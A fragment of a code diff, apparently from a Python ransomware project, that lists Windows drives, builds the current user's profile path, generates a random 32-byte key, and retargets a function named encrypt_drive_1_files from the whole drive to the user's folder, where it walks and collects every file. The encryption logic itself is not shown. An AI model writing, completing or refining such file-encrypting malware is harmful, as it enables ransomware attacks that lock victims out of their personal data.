@@ -14,10 +14,6 @@ drives = drives.split('\000')[:-1]
 
 drive_1 = drives[0]
 
-print(drive_1)
-
-path = drive_1
-
 username = getpass.getuser()
 
 user_c_path = drive_1 + "Users\\" + username + "\\"
@@ -28,7 +24,7 @@ key = get_random_bytes (32)
 
 def encrypt_drive_1_files():
 
-    path = drive_1
+    path = user_c_path
     files = []
     for r, d, f in os.walk(path):
         for file in f:
